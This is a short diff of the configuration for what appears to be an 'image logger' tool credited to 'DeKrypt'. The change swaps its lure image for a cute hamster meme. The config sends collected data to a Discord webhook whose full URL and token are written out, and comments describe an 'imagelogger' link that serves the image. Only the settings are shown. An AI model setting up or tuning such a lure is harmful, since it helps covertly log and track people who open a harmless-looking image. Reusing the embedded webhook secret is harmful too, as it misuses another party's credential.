@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1538395973792043109/5kwVyiDP_LHmqdiDu9dvoIpFc17MUlHZ5ZrLSH1vcVE3h9-wvSinjQ_QFk_2ECSlx-WV",
-    "image": "https://i.pinimg.com/736x/37/6a/df/376adf8cbd804227230a63cbed034028.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://static.vecteezy.com/system/resources/previews/045/648/580/non_2x/cute-hamster-meme-transparent-background-illustration-free-png.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
